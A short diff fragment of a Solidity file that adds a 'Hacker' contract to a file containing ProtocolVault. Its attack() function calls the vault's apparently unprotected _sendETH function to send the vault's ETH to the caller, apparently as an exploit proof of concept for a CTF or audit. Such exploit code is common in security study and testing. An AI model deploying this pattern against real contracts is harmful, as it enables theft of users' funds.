@@ -27,3 +27,20 @@ contract ProtocolVault {
     function() external payable {}
 }
 
+contract Hacker {
+    ProtocolVault vault;
+    address owner;
+
+    function Hacker(address _vault) {
+        vault = ProtocolVault(_vault);
+        owner = msg.sender;
+    }
+
+    function attack() {
+        vault._sendETH(msg.sender);
+    }
+
+
+
+}
+
